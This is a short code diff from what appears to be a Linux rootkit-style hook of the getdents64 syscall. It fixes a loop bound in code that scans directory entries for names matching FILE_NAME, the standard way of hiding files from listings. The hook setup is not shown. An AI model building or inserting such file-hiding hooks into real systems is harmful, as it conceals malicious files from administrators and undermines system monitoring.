@@ -26,12 +26,13 @@ d_reclen: Size of this dirent
 d_name:   Filename (null-terminated)
 
 nob: number of bytes
+cur: current
 */
   int nob = getdents64_original(fd, dirp, count);
   struct linux_dirent64 *cur = dirp;
 
   int i = 0;
-  while(i < rtn) {
+  while(i < nob) {
     int size = cur->d_reclen;
 
     if(strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
